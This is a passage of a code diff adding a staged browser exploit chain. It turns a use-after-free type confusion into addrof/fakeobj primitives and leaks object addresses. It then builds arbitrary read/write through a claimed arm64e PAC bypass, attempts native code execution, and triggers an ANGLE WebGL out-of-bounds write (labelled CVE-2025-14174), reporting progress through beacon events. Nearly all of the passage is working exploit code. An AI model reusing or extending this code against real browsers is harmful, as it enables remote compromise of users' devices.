+            // Inline addrof for each pre-allocated target - NO ALLOCATIONS!
+            boxed_arr[0] = preAllocatedTargets.arrayBuffer;
+            leakedAddrs.arrayBuffer = ftoi(unboxed_arr[0]);
+
+            boxed_arr[0] = preAllocatedTargets.float64Array;
+            leakedAddrs.float64Array = ftoi(unboxed_arr[0]);
+
+            boxed_arr[0] = preAllocatedTargets.uint32Array;
+            leakedAddrs.uint32Array = ftoi(unboxed_arr[0]);
+
+            boxed_arr[0] = preAllocatedTargets.testObject;
+            leakedAddrs.testObject = ftoi(unboxed_arr[0]);
+
+            boxed_arr[0] = preAllocatedTargets.testArray;
+            leakedAddrs.testArray = ftoi(unboxed_arr[0]);
+
+            boxed_arr[0] = preAllocatedTargets.testFunction;
+            leakedAddrs.testFunction = ftoi(unboxed_arr[0]);
+
+            boxed_arr[0] = preAllocatedTargets.stage6FuncA;
+            leakedAddrs.stage6FuncA = ftoi(unboxed_arr[0]);
+
+            boxed_arr[0] = preAllocatedTargets.stage6FuncB;
+            leakedAddrs.stage6FuncB = ftoi(unboxed_arr[0]);
+
+            // Immediate sanity check while primitive is hottest: do leaked A/B
+            // decode back to distinct function objects right now?
+            try {
+                unboxed_arr[0] = itof(leakedAddrs.stage6FuncA);
+                const eqAObj = boxed_arr[0];
+                const eqA = (eqAObj === preAllocatedTargets.stage6FuncA) ? 1 : 0;
+                const eqAB = (eqAObj === preAllocatedTargets.stage6FuncB) ? 1 : 0;
+                unboxed_arr[0] = itof(leakedAddrs.stage6FuncB);
+                const eqBObj = boxed_arr[0];
+                const eqB = (eqBObj === preAllocatedTargets.stage6FuncB) ? 1 : 0;
+                const eqBA = (eqBObj === preAllocatedTargets.stage6FuncA) ? 1 : 0;
+                beaconEvent('stage1_addr_eq', `a=0x${leakedAddrs.stage6FuncA.toString(16)};b=0x${leakedAddrs.stage6FuncB.toString(16)};eqA=${eqA};eqAB=${eqAB};eqB=${eqB};eqBA=${eqBA}`);
+            } catch (e) {
+                beaconEvent('stage1_addr_eq', `err=${encodeURIComponent((e.message || 'unknown').slice(0, 80))}`);
+            }
+
+            boxed_arr[0] = preAllocatedTargets.evalFunc;
+            leakedAddrs.evalFunc = ftoi(unboxed_arr[0]);
+
+            boxed_arr[0] = preAllocatedTargets.windowObj;
+            leakedAddrs.windowObj = ftoi(unboxed_arr[0]);
+
+            boxed_arr[0] = preAllocatedTargets.documentObj;
+            leakedAddrs.documentObj = ftoi(unboxed_arr[0]);
+
+            // Leak arb r/w buffer addresses
+            boxed_arr[0] = preAllocatedTargets.fakeObjBuffer;
+            leakedAddrs.fakeObjBuffer = ftoi(unboxed_arr[0]);
+
+            boxed_arr[0] = preAllocatedTargets.victimBuffer;
+            leakedAddrs.victimBuffer = ftoi(unboxed_arr[0]);
+
+            boxed_arr[0] = preAllocatedTargets.victimF64;
+            leakedAddrs.victimF64 = ftoi(unboxed_arr[0]);
+
+            // Leak PAC bypass related object addresses
+            boxed_arr[0] = preAllocatedTargets.fakeArrayContainer;
+            leakedAddrs.fakeArrayContainer = ftoi(unboxed_arr[0]);
+
+            boxed_arr[0] = preAllocatedTargets.arrayReaderContainer;
+            leakedAddrs.arrayReaderContainer = ftoi(unboxed_arr[0]);
+
+            boxed_arr[0] = preAllocatedTargets.realF64ForStealing;
+            leakedAddrs.realF64ForStealing = ftoi(unboxed_arr[0]);
+
+            boxed_arr[0] = preAllocatedTargets.stablePrimitivesBuffer;
+            leakedAddrs.stablePrimitivesBuffer = ftoi(unboxed_arr[0]);
+
+            // Leak inline storage template addresses (for PAC bypass)
+            boxed_arr[0] = preAllocatedTargets.inlineTemplate;
+            leakedAddrs.inlineTemplate = ftoi(unboxed_arr[0]);
+
+            boxed_arr[0] = preAllocatedTargets.inlineTemplate2;
+            leakedAddrs.inlineTemplate2 = ftoi(unboxed_arr[0]);
+
+            boxed_arr[0] = preAllocatedTargets.stage5Probe;
+            leakedAddrs.stage5Probe = ftoi(unboxed_arr[0]);
+
+            // CRITICAL: Leak corruption target addresses NOW while primitives work!
+            for (let i = 0; i < corruptionTargets.length; i++) {
+                boxed_arr[0] = corruptionTargets[i].buffer;
+                corruptionLeakedAddrs[i] = ftoi(unboxed_arr[0]);
+            }
+
+            // Try fakeobj inline - write address, read object
+            // Store in exploitState.fakeObjTest directly to avoid let allocation
+            unboxed_arr[0] = itof(leakedAddrs.arrayBuffer);
+            exploitState.fakeObjTest = boxed_arr[0];
+
+            // ================================================================
+            // ANALYZE PAC RESTRICTIONS
+            // ================================================================
+            // The addrof/fakeobj primitives work, but arm64e PAC blocks
+            // arbitrary memory access via fake TypedArray/JSArray objects.
+            // This function analyzes what we can and cannot do.
+            // ================================================================
+
+            // Create temporary addrof/fakeobj using current working primitives
+            const tempAddrof = function(obj) {
+                boxed_arr[0] = obj;
+                return ftoi(unboxed_arr[0]);
+            };
+            const tempFakeobj = function(addr) {
+                unboxed_arr[0] = itof(addr);
+                return boxed_arr[0];
+            };
+
+            // Store tempAddrof/tempFakeobj for later BSP call
+            exploitState.tempAddrof = tempAddrof;
+            exploitState.tempFakeobj = tempFakeobj;
+
+            // Try to build stronger primitives from harvested object metadata.
+            // This runs after core Stage 1 leak setup but before we leave the
+            // reclaimed-cell window.
+            if (ENABLE_BSP_EXPERIMENT) {
+                try {
+                    const bspResult = buildStablePrimitives(tempAddrof, tempFakeobj, itof, ftoi);
+                    exploitState.bspResult = bspResult || null;
+                    if (exploitState.bspResult) {
+                        const sid = (typeof exploitState.bspResult.harvestedStructureID === 'bigint')
+                            ? `0x${exploitState.bspResult.harvestedStructureID.toString(16)}`
+                            : (typeof stablePrims.harvestedStructureID === 'bigint' ? `0x${stablePrims.harvestedStructureID.toString(16)}` : 'none');
+                        const found = exploitState.bspResult.foundAdjacent ? 1 : 0;
+                        const method = exploitState.bspResult.method || 'unknown';
+                        const st = exploitState.bspResult.stats || {};
+                        const s_sp = typeof st.smallSpacingCount === 'number' ? st.smallSpacingCount : -1;
+                        const s_va = typeof st.validAddrCount === 'number' ? st.validAddrCount : -1;
+                        const s_ca = typeof st.candidateAttempts === 'number' ? st.candidateAttempts : -1;
+                        const s_sc = typeof st.sidCandidateCount === 'number' ? st.sidCandidateCount : -1;
+                        const sample = Array.isArray(st.sidSamples) ? st.sidSamples.slice(0, 3).join('|') : 'none';
+                        beaconEvent('bsp_result', `found=${found};sid=${sid};method=${method};valid=${s_va};small=${s_sp};cands=${s_ca};sidc=${s_sc};sample=${sample}`);
+                    }
+                } catch (e) {
+                    exploitState.bspResult = { method: 'exception', error: String(e && e.message ? e.message : e) };
+                    beaconEvent('bsp_result', `found=0;sid=none;method=exception;err=${encodeURIComponent(String(e && e.message ? e.message : e).slice(0, 80))}`);
+                }
+            }
+
+            // ================================================================
+            // INLINE STORAGE PROOF - IN CRITICAL SECTION, NO LOGGING
+            // ================================================================
+            // fakeobj(addr) returns object at addr
+            // Reading obj.slot0 reads memory at addr + 0x10 (inline slot 0)
+            // So: read64(X) = fakeobj(X - 0x10).slot0
+            // ================================================================
+            const INLINE_SLOT_OFFSET = 0x10n;
+            const INLINE_MARKER = 0x4141414142424242n;
+
+            // Test 1: Basic fakeobj self-test
+            inlineTemplate.slot0 = itof(INLINE_MARKER);
+            unboxed_arr[0] = itof(leakedAddrs.inlineTemplate);
+            const fakeSelf = boxed_arr[0];
+            let inlineSelfWorks = false;
+            try {
+                const readBack = ftoi(fakeSelf.slot0);
+                inlineSelfWorks = (readBack === INLINE_MARKER);
+            } catch (e) { }
+
+            // Test 2: Arbitrary read - read inlineTemplate2's slot0 using only its address
+            // This is the real PAC bypass test: read at (addr + 0x10) via fakeobj(addr)
+            const INLINE_MARKER2 = 0x1337133713371337n;
+            inlineTemplate2.prop0 = itof(INLINE_MARKER2);
+            // Read inlineTemplate2.prop0 using ONLY the leaked address
+            unboxed_arr[0] = itof(leakedAddrs.inlineTemplate2);
+            const fakeT2 = boxed_arr[0];
+            let arbReadWorks = false;
+            let arbReadValue = 0n;
+            try {
+                arbReadValue = ftoi(fakeT2.prop0);
+                arbReadWorks = (arbReadValue === INLINE_MARKER2);
+            } catch (e) { }
+
+            // Test 3: Arbitrary write - write to inlineTemplate2 via fake object
+            const WRITE_MARKER = 0xDEADBEEFCAFEBABEn;
+            let arbWriteWorks = false;
+            try {
+                fakeT2.prop0 = itof(WRITE_MARKER);
+                // Verify by reading back through REAL object
+                const verifyWrite = ftoi(inlineTemplate2.prop0);
+                arbWriteWorks = (verifyWrite === WRITE_MARKER);
+            } catch (e) { }
+
+            // Store results - NO LOGGING YET
+            evidence.inlineSelfWorks = inlineSelfWorks;
+            evidence.inlineArbRead = arbReadWorks;
+            evidence.inlineArbWrite = arbWriteWorks;
+            evidence.inlineStorageWorks = inlineSelfWorks && arbReadWorks && arbWriteWorks;
+            exploitState.inlineSelfWorks = inlineSelfWorks;
+            exploitState.inlineArbRead = arbReadWorks;
+            exploitState.inlineArbWrite = arbWriteWorks;
+
+            // Only claim PAC bypass if arb read AND write work
+            const fullPacBypass = inlineSelfWorks && arbReadWorks && arbWriteWorks;
+            exploitState.pacBlocked = !fullPacBypass;
+            evidence.arbRWWorks = fullPacBypass;
+
+            // Build actual read64/write64 if inline storage works
+            if (fullPacBypass) {
+                // read64(addr) - read 8 bytes at addr
+                // fakeobj(addr - 0x10).slot0 reads at (addr - 0x10) + 0x10 = addr
+                exploitState.read64 = function(addr) {
+                    unboxed_arr[0] = itof(addr - INLINE_SLOT_OFFSET);
+                    const fake = boxed_arr[0];
+                    const v = fake.slot0;
+                    if (typeof v === 'number') {
+                        return ftoi(v);
+                    }
+                    if ((typeof v === 'object' && v !== null) || typeof v === 'function') {
+                        // Preserve object/function-tagged JSValues via boxed/unboxed bridge.
+                        boxed_arr[0] = v;
+                        const bits = ftoi(unboxed_arr[0]);
+                        // Keep boxed_arr in object-contiguous mode for addrof/fakeobj stability.
+                        boxed_arr[0] = preAllocatedTargets.testObject;
+                        return bits;
+                    }
+                    // Primitive JSValues that don't map cleanly to number/object are not
+                    // currently representable by this primitive path.
+                    return 0x7ff8000000000000n;
+                };
+
+                // write64(addr, val) - write 8 bytes at addr
+                exploitState.write64 = function(addr, val) {
+                    unboxed_arr[0] = itof(addr - INLINE_SLOT_OFFSET);
+                    const fake = boxed_arr[0];
+                    fake.slot0 = itof(val);
+                };
+
+                exploitState.stablePrimitivesReady = true;
+            } else {
+                exploitState.stablePrimitivesReady = false;
+            }
+
+            // Also verify fakeobj works with Float64Array
+            unboxed_arr[0] = itof(leakedAddrs.float64Array);
+            arbRWState.fakeFloat64Array = boxed_arr[0];
+            arbRWState.victimAddr = leakedAddrs.victimBuffer;
+            arbRWState.ready = true;
+
+            // Store results
+            exploitState.boxedArray = boxed_arr;
+            exploitState.unboxedArray = unboxed_arr;
+            exploitState.addrof = function(obj) {
+                exploitState.boxedArray[0] = obj;
+                return ftoi(exploitState.unboxedArray[0]);
+            };
+            exploitState.fakeobj = function(addr) {
+                exploitState.unboxedArray[0] = itof(addr);
+                return exploitState.boxedArray[0];
+            };
+            exploitState.leakedAddresses = leakedAddrs;
+            exploitState.primitivesWorked = true;
+            exploitState.arbRWState = arbRWState;
+
+            // Direct hot-window executable swap attempt before log churn.
+            if (HOT_STAGE6_IN_CRITICAL && HOT_NATIVE_SWAP && exploitState.stablePrimitivesReady && !evidence.nativeExecWorks) {
+                try {
+                    beaconEvent('stage6_hot_start', `a=0x${leakedAddrs.stage6FuncA.toString(16)};b=0x${leakedAddrs.stage6FuncB.toString(16)}`);
+                    let hot = attemptHotNativeSwapBySlotCopy(
+                        leakedAddrs.stage6FuncA,
+                        leakedAddrs.stage6FuncB,
+                        preAllocatedTargets.stage6FuncA,
+                        preAllocatedTargets.stage6FuncB
+                    );
+                    if (!hot.ok) {
+                        hot = attemptHotNativeSwap(
+                            leakedAddrs.stage6FuncA,
+                            leakedAddrs.stage6FuncB,
+                            preAllocatedTargets.stage6FuncA,
+                            preAllocatedTargets.stage6FuncB
+                        );
+                    }
+                    if (hot.ok) {
+                        evidence.nativeExecWorks = true;
+                        exploitState.stage6Complete = true;
+                        exploitState.nativeExecDetails = [
+                            `mode=hot_swap`,
+                            hot.execA !== undefined ? `execA=0x${BigInt(hot.execA).toString(16)}` : '',
+                            hot.execB !== undefined ? `execB=0x${BigInt(hot.execB).toString(16)}` : '',
+                            hot.donorType ? `donorType=${hot.donorType}` : '',
+                            `fieldA=0x${hot.fieldA.toString(16)}`,
+                            `fieldB=0x${hot.fieldB.toString(16)}`,
+                            `beforeA=${hot.beforeA}`,
+                            `beforeB=${hot.beforeB}`,
+                            `swapped=${hot.swapped}`,
+                            `restored=${hot.restored}`,
+                            hot.w0 !== undefined ? `w0=${hot.w0}` : '',
+                            hot.w1 !== undefined ? `w1=${hot.w1}` : '',
+                            hot.w2 !== undefined ? `w2=${hot.w2}` : '',
+                            hot.w3 !== undefined ? `w3=${hot.w3}` : ''
+                        ].filter(Boolean).join(';');
+                        beaconEvent('stage6_hot_end', `native=1;${exploitState.nativeExecDetails}`);
+                    } else {
+                        const details = [
+                            `native=0`,
+                            `reason=${hot.reason || 'unknown'}`,
+                            hot.fieldA ? `fieldA=0x${hot.fieldA.toString(16)}` : '',
+                            hot.fieldB ? `fieldB=0x${hot.fieldB.toString(16)}` : '',
+                            hot.execA !== undefined ? `execA=0x${BigInt(hot.execA).toString(16)}` : '',
+                            hot.execB !== undefined ? `execB=0x${BigInt(hot.execB).toString(16)}` : '',
+                            hot.beforeA !== undefined ? `beforeA=${hot.beforeA}` : '',
+                            hot.beforeB !== undefined ? `beforeB=${hot.beforeB}` : '',
+                            hot.swapped !== undefined ? `swapped=${hot.swapped}` : '',
+                            hot.restored !== undefined ? `restored=${hot.restored}` : ''
+                        ].filter(Boolean).join(';');
+                        beaconEvent('stage6_hot_end', details);
+                    }
+                } catch (e) {
+                    beaconEvent('stage6_hot_end', `native=0;reason=exception_${encodeURIComponent((e.message || 'unknown').slice(0, 80))}`);
+                }
+            }
+        }
+
+        // NOW safe to log - all leaking is done!
+        log(`  [${k}] BUTTERFLY RECLAIMED! Type confusion achieved!`, 'critical');
+
+        if (testResult1 === "EXCEPTION") {
+            log(`  unboxed_arr[0] threw exception - cell invalid`, 'fail');
+        } else {
+            log(`  unboxed_arr[0] = ${testResult1}`, 'info');
+        }
+
+        log(`  addrof(boxed_arr) = 0x${testResult2.toString(16)}`, 'info');
+        log(`  addrof(uafArray) = 0x${testResult3.toString(16)}`, 'info');
+
+        if (primitivesWork) {
+            // Leaking already done above - just log results and store primitives
+            const CANONICAL_NAN = 0x7ff8000000000000n;
+
+            // Store working primitives (may not work after GC, but useful for reference)
+            exploitState.boxedArray = boxed_arr;
+            exploitState.unboxedArray = unboxed_arr;
+
+            exploitState.addrof = function(obj) {
+                exploitState.boxedArray[0] = obj;
+                return ftoi(exploitState.unboxedArray[0]);
+            };
+
+            exploitState.fakeobj = function(addr) {
+                exploitState.unboxedArray[0] = itof(addr);
+                return exploitState.boxedArray[0];
+            };
+
+            // Evidence checks for addrof/fakeobj
+            evidence.addrofWorks = (testResult2 !== CANONICAL_NAN && testResult3 !== CANONICAL_NAN && testResult2 !== testResult3);
+            evidence.fakeobjWorks = (exploitState.fakeObjTest === preAllocatedTargets.arrayBuffer);
+
+            // NOW safe to log - primitives captured
+            log(`  PRIMITIVES WORKING! Different addresses for different objects!`, 'success');
+            log(`  === LEAKED ADDRESSES (captured while primitives valid) ===`, 'critical');
+            log(`    boxed_arr:     0x${leakedAddrs.boxed_arr.toString(16)}`, 'critical');
+            log(`    uafArray:      0x${leakedAddrs.uafArray.toString(16)}`, 'critical');
+            log(`    ArrayBuffer:   0x${leakedAddrs.arrayBuffer.toString(16)}`, 'critical');
+            log(`    Float64Array:  0x${leakedAddrs.float64Array.toString(16)}`, 'critical');
+            log(`    Uint32Array:   0x${leakedAddrs.uint32Array.toString(16)}`, 'critical');
+            log(`    testObject:    0x${leakedAddrs.testObject.toString(16)}`, 'critical');
+            log(`    testArray:     0x${leakedAddrs.testArray.toString(16)}`, 'critical');
+            log(`    testFunction:  0x${leakedAddrs.testFunction.toString(16)}`, 'critical');
+            log(`    stage6FuncA:   0x${leakedAddrs.stage6FuncA.toString(16)}`, 'critical');
+            log(`    stage6FuncB:   0x${leakedAddrs.stage6FuncB.toString(16)}`, 'critical');
+            log(`    eval():        0x${leakedAddrs.evalFunc.toString(16)}`, 'critical');
+            log(`    window:        0x${leakedAddrs.windowObj.toString(16)}`, 'critical');
+            log(`    document:      0x${leakedAddrs.documentObj.toString(16)}`, 'critical');
+            log(`    fakeObjBuffer: 0x${leakedAddrs.fakeObjBuffer.toString(16)}`, 'critical');
+            log(`    victimBuffer:  0x${leakedAddrs.victimBuffer.toString(16)}`, 'critical');
+            log(`    victimF64:     0x${leakedAddrs.victimF64.toString(16)}`, 'critical');
+            log(`  === PAC BYPASS OBJECTS ===`, 'critical');
+            log(`    fakeArrayContainer:    0x${leakedAddrs.fakeArrayContainer.toString(16)}`, 'critical');
+            log(`    arrayReaderContainer:  0x${leakedAddrs.arrayReaderContainer.toString(16)}`, 'critical');
+            log(`    realF64ForStealing:    0x${leakedAddrs.realF64ForStealing.toString(16)}`, 'critical');
+            log(`    stablePrimitivesBuffer:0x${leakedAddrs.stablePrimitivesBuffer.toString(16)}`, 'critical');
+            log(`  === INLINE STORAGE TEMPLATES ===`, 'critical');
+            log(`    inlineTemplate:        0x${leakedAddrs.inlineTemplate.toString(16)}`, 'critical');
+            log(`    inlineTemplate2:       0x${leakedAddrs.inlineTemplate2.toString(16)}`, 'critical');
+
+            // Log corruption target addresses
+            let validTargets = 0;
+            for (let i = 0; i < corruptionLeakedAddrs.length; i++) {
+                if (corruptionLeakedAddrs[i] !== CANONICAL_NAN) validTargets++;
+            }
+            log(`  Corruption targets: ${validTargets}/${corruptionLeakedAddrs.length} valid addresses`, validTargets > 0 ? 'success' : 'warn');
+            if (validTargets > 0) {
+                log(`    Target 0: 0x${corruptionLeakedAddrs[0].toString(16)}`, 'info');
+                log(`    Target 1: 0x${corruptionLeakedAddrs[1].toString(16)}`, 'info');
+            }
+
+            // Check if all addresses are valid (not NaN)
+            let validCount = 0;
+            let totalCount = 0;
+            for (const [name, addr] of Object.entries(leakedAddrs)) {
+                totalCount++;
+                if (addr !== CANONICAL_NAN) validCount++;
+            }
+            log(`  Valid addresses: ${validCount}/${totalCount}`, validCount === totalCount ? 'success' : 'warn');
+
+            let fakeObjResult = exploitState.fakeObjTest;
+            log(`  fakeobj test result: ${typeof fakeObjResult === 'object' ? 'Got object!' : fakeObjResult}`, 'info');
+            if (typeof fakeObjResult === 'object' && fakeObjResult !== null) {
+                log(`    fakeobj type: ${fakeObjResult.constructor?.name || typeof fakeObjResult}`, 'critical');
+            }
+
+            // Report Stage 1 primitives status
+            log(`\n  === STAGE 1 PRIMITIVES ===`, 'critical');
+            log(`  addrof: WORKING`, 'success');
+            log(`  fakeobj: WORKING`, 'success');
+
+            // Log inline storage results (proof was done in critical section)
+            log(`\n  === INLINE STORAGE PAC BYPASS TESTS ===`, 'critical');
+            log(`  1. fakeobj self-test: ${exploitState.inlineSelfWorks}`, exploitState.inlineSelfWorks ? 'success' : 'fail');
+            log(`  2. arb read (addr only): ${exploitState.inlineArbRead}`, exploitState.inlineArbRead ? 'success' : 'fail');
+            log(`  3. arb write (verified): ${exploitState.inlineArbWrite}`, exploitState.inlineArbWrite ? 'success' : 'fail');
+            log(`  Template addr: 0x${leakedAddrs.inlineTemplate.toString(16)}`, 'info');
+            log(`  Template2 addr: 0x${leakedAddrs.inlineTemplate2.toString(16)}`, 'info');
+
+            if (exploitState.bspResult) {
+                const br = exploitState.bspResult;
+                log(`\n  === BSP STRUCTURE HARVEST ===`, 'critical');
+                log(`  method: ${br.method || 'unknown'}`, br.method && br.method.includes('failed') ? 'warn' : 'info');
+                if (typeof br.harvestedStructureID === 'bigint') {
+                    log(`  harvestedStructureID: 0x${br.harvestedStructureID.toString(16)}`, 'critical');
+                } else if (typeof stablePrims.harvestedStructureID === 'bigint') {
+                    log(`  harvestedStructureID: 0x${stablePrims.harvestedStructureID.toString(16)}`, 'critical');
+                }
+                if (br.adjacentInfo && typeof br.adjacentInfo.slotIndex !== 'undefined') {
+                    log(`  adjacent slotIndex=${br.adjacentInfo.slotIndex} diff=0x${(br.adjacentInfo.diff || 0n).toString(16)}`, 'info');
+                }
+            }
+
+            if (exploitState.stablePrimitivesReady) {
+                log(`  read64/write64: CONSTRUCTED`, 'critical');
+                if (evidence.arbRWWorks) {
+                    log(`  PAC BYPASS: FULL ARB R/W ACHIEVED!`, 'critical');
+                } else {
+                    log(`  PAC BYPASS: UNVERIFIED (need arb r/w proof)`, 'warn');
+                }
+                updatePrimitiveStatus('read64', 'WORKING', true);
+                updatePrimitiveStatus('write64', 'WORKING', true);
+            } else if (evidence.inlineStorageWorks) {
+                log(`  Inline storage works but full r/w not available`, 'warn');
+                updatePrimitiveStatus('read64', 'PARTIAL', false);
+                updatePrimitiveStatus('write64', 'PARTIAL', false);
+            } else {
+                log(`  Inline storage failed - PAC blocking access`, 'warn');
+                updatePrimitiveStatus('read64', 'PAC BLOCKED', false);
+                updatePrimitiveStatus('write64', 'PAC BLOCKED', false);
+            }
+
+            // Attempt native execution proof immediately while primitives are still hot.
+            if (exploitState.stablePrimitivesReady && !evidence.nativeExecWorks) {
+                log(`  Early Stage 6 probe (hot primitive window)...`, 'info');
+                try {
+                    const earlyNative = await runStage6();
+                    if (earlyNative) {
+                        log(`  Early Stage 6: SUCCESS`, 'critical');
+                    } else {
+                        log(`  Early Stage 6: no native swap yet`, 'warn');
+                    }
+                } catch (e) {
+                    log(`  Early Stage 6 probe failed: ${e.message}`, 'warn');
+                }
+            }
+
+            updatePrimitiveStatus('addrof', `WORKING (0x${testResult2.toString(16)})`, true);
+            updatePrimitiveStatus('fakeobj', 'WORKING', true);
+            logEvidenceSummary();
+        } else {
+            log(`  WARNING: Primitives not working - got NaN or same addresses`, 'warn');
+            log(`  This could mean:`, 'warn');
+            log(`    1. GC invalidated the freed cell before we could use it`, 'warn');
+            log(`    2. Butterfly conversion reallocated to different address`, 'warn');
+            log(`    3. freed's structure no longer supports indexed access`, 'warn');
+            updatePrimitiveStatus('addrof', `BROKEN (NaN)`, false);
+            evidence.addrofWorks = false;
+            evidence.fakeobjWorks = false;
+            logEvidenceSummary();
+
+            // Store anyway for debugging
+            exploitState.boxedArray = boxed_arr;
+            exploitState.unboxedArray = unboxed_arr;
+            exploitState.addrof = function(obj) {
+                exploitState.boxedArray[0] = obj;
+                return ftoi(exploitState.unboxedArray[0]);
+            };
+            exploitState.fakeobj = function(addr) {
+                exploitState.unboxedArray[0] = itof(addr);
+                return exploitState.boxedArray[0];
+            };
+        }
+
+        exploitState.stage1Complete = true;
+        break;
+    }
+
+    if (success) {
+        log('STAGE 1 COMPLETE: addrof/fakeobj primitives obtained!', 'stage1');
+        log(`  Total spray arrays allocated: ${uafReclaimed.length}`, 'info');
+        beaconEvent(
+            'stage1_end',
+            `ok=1;addrof=${evidence.addrofWorks ? 1 : 0};fakeobj=${evidence.fakeobjWorks ? 1 : 0};inline=${evidence.inlineStorageWorks ? 1 : 0};stable=${exploitState.stablePrimitivesReady ? 1 : 0};bsp=${exploitState.bspResult ? 1 : 0}`
+        );
+    } else {
+        log('STAGE 1 FAILED: Could not win race after max attempts', 'fail');
+        log('  This is expected - UAF race is probabilistic', 'info');
+        log('  Try running again or increase CONFIG values', 'info');
+        beaconEvent('stage1_end', 'ok=0;reason=no_race_win');
+    }
+
+    return success;
+}
+
+// =============================================================================
+// STAGE 2: GPU Canary Harness Setup
+// =============================================================================
+//
+// Build WebGL-resident texture/PBO canaries and snapshot baseline state.
+// Stage 3 compares against this baseline after each ANGLE trigger attempt to
+// detect GPU-process side-effects directly in GPU-managed resources.
+//
+// =============================================================================
+
+async function runStage2() {
+    log('\n========================================', 'stage2');
+    log('STAGE 2: GPU Canary Harness Setup', 'stage2');
+    log('========================================', 'stage2');
+    log('Goal: Build GPU-process canaries for post-trigger corruption detection', 'info');
+
+    await new Promise(r => setTimeout(r, 10));
+
+    try {
+        const gl = ensureGL2Context();
+        if (!gl) {
+            log('WebGL2 not available - cannot build harness', 'fail');
+            beaconEvent('stage2_fail', 'no_webgl2');
+            return false;
+        }
+
+        exploitState.gpuHarness = setupGPUCanaryHarness(gl);
+        exploitState.gl = gl;
+        exploitState.gpuContextLost = false;
+        exploitState.gpuTriggerAttempts = 0;
+        exploitState.gpuHeapCorruptions = 0;
+        exploitState.lastGpuHeapHit = null;
+        evidence.gpuCanaryCorruption = false;
+        evidence.gpuHeapCorruption = false;
+        evidence.gpuContextLost = false;
+
+        log(`Texture canaries: ${exploitState.gpuHarness.textureCanaries.length}`, 'success');
+        log(`PBO canaries: ${exploitState.gpuHarness.pboCanaries.length}`, 'success');
+        if (exploitState.gpuHarness.disableTextureCanaries) {
+            log('Texture canary readback disabled (FBO unsupported); using PBO-only baseline', 'warn');
+        }
+        log('Baseline GPU canary snapshot captured', 'success');
+
+        exploitState.stage2Complete = true;
+        log('STAGE 2 COMPLETE: GPU canary harness ready', 'stage2');
+        beaconEvent('stage2_ok', `textures=${exploitState.gpuHarness.textureCanaries.length};pbos=${exploitState.gpuHarness.pboCanaries.length}`);
+
+        return true;
+    } catch (e) {
+        log(`Stage 2 failed: ${e.message}`, 'fail');
+        beaconEvent('stage2_fail', e.message || 'exception');
+        console.error(e);
+        return false;
+    }
+}
+
+// =============================================================================
+// STAGE 3: ANGLE OOB Write (CVE-2025-14174)
+// =============================================================================
+//
+// The bug: In ANGLE's Metal backend, when uploading D32F depth textures
+// via PBO, the staging buffer is sized using UNPACK_IMAGE_HEIGHT instead
+// of actual texture height. When UNPACK_IMAGE_HEIGHT < height, this causes
+// an undersized allocation followed by OOB write.
+//
+// Trigger:
+// 1. Create WebGL2 context
+// 2. Create PBO with depth data
+// 3. Set UNPACK_IMAGE_HEIGHT < actual height
+// 4. Upload D32F texture via texImage2D from PBO
+// 5. OOB write = rowPitch * (height - UNPACK_IMAGE_HEIGHT)
+// =============================================================================
+
+async function runStage3() {
+    log('\n========================================', 'stage3');
+    log('STAGE 3: ANGLE OOB Trigger + GPU Oracles', 'stage3');
+    log('========================================', 'stage3');
+    log('Goal: Trigger setSubImageImpl OOB path and check heap-oracle + baseline GPU canaries', 'info');
+    beaconEvent('stage3_start', 'runStage3');
+
+    await new Promise(r => setTimeout(r, 10));
+
+    let gl = exploitState.gl || ensureGL2Context();
+    if (!gl || gl.isContextLost()) {
+        log('WebGL2 unavailable or context lost; reinitializing Stage 2 context', 'warn');
+        exploitState.stage2Complete = false;
+        exploitState.gpuHarness = null;
+        const recovered = await runStage2();
+        gl = exploitState.gl;
+        if (!recovered || !gl || gl.isContextLost()) {
+            log('WebGL2 unavailable or context already lost', 'fail');
+            beaconEvent('stage3_fail', 'no_context_or_lost');
+            return false;
+        }
+    }
+
+    if (!exploitState.stage2Complete || !exploitState.gpuHarness) {
+        log('Stage 2 harness not ready - initializing now', 'info');
+        const ok = await runStage2();
+        if (!ok || !exploitState.gpuHarness) {
+            log('Failed to initialize GPU harness', 'fail');
+            beaconEvent('stage3_fail', 'stage2_harness_unavailable');
+            return false;
+        }
+    }
+
+    evidence.gpuCanaryCorruption = false;
+    evidence.gpuHeapCorruption = false;
+    evidence.gpuContextLost = false;
+    evidence.angleCorruptionDetected = false;
+    exploitState.gpuTriggerAttempts = 0;
+    exploitState.gpuHeapCorruptions = 0;
+    exploitState.lastGpuHeapHit = null;
+
+    try {
+        const attempts = [
+            { width: 1024, height: 2048, unpackImageHeight: 1, useSubImage: false, guardCount: 48, holeMode: 0 },
+            { width: 1536, height: 2048, unpackImageHeight: 1, useSubImage: true, guardCount: 64, holeMode: 1 },
+            { width: 2048, height: 2048, unpackImageHeight: 1, useSubImage: false, guardCount: 64, holeMode: 2 },
+            { width: 2048, height: 3072, unpackImageHeight: 1, useSubImage: true, guardCount: 80, holeMode: 0 },
+            { width: 3072, height: 3072, unpackImageHeight: 1, useSubImage: false, guardCount: 96, holeMode: 1 },
+        ];
+
+        let anyTriggered = false;
+        let maxOob = 0;
+        const harness = exploitState.gpuHarness;
+        const rounds = 4;
+        const stage3StartMs = performance.now();
+        const stage3BudgetMs = 7000;
+        let budgetExpired = false;
+
+        for (let round = 0; round < rounds; round++) {
+            log(`Round ${round + 1}/${rounds}`, 'info');
+
+            for (let i = 0; i < attempts.length; i++) {
+                if ((performance.now() - stage3StartMs) >= stage3BudgetMs) {
+                    budgetExpired = true;
+                    log(`Stage 3 budget exhausted at ${Math.round(performance.now() - stage3StartMs)}ms`, 'warn');
+                    break;
+                }
+                const cfg = attempts[i];
+                const globalAttempt = round * attempts.length + i;
+                const oracleResult = triggerANGLEWithHeapOracle(gl, cfg, 0x6000 + globalAttempt * 0x211);
+                const result = oracleResult.triggerResult;
+                exploitState.gpuTriggerAttempts++;
+                maxOob = Math.max(maxOob, result.oobWriteSize);
+
+                log(
+                    `Attempt ${globalAttempt + 1}: ${cfg.width}x${cfg.height}, UNPACK_IMAGE_HEIGHT=${cfg.unpackImageHeight}, mode=${cfg.useSubImage ? 'texSubImage2D' : 'texImage2D'}`,
+                    'info'
+                );
+                log(`  Estimated OOB size: ${result.oobWriteSize} bytes`, 'critical');
+                log(`  Heap oracle allocSize=${oracleResult.allocSize}, freed=${oracleResult.freed.length}`, 'info');
+
+                anyTriggered = true;
+                evidence.angleTriggered = true;
+                if (result.err !== gl.NO_ERROR && !result.contextLost) {
+                    log(`  GL error: 0x${result.err.toString(16)}`, 'warn');
+                }
+
+                if (result.contextLost) {
